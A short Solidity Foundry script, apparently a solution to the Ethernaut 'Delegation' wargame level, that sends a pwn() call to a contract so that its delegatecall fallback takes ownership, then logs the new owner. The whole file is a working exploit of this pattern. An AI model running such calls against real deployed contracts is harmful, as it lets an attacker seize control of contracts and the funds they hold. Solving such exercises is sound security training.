// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/Test.sol";
import "../src/Delegation.sol";

contract DelegationAttackScript is Script {
    function setUp() public {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PK");
        address delegationAddress = vm.envAddress("DELEGATION_ADDRESS");
        vm.startBroadcast(deployerPrivateKey);
        (bool success, ) = delegationAddress.call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "Call failed");
        console.log("New owner", Delegation(delegationAddress).owner());
        vm.stopBroadcast();
    }
}
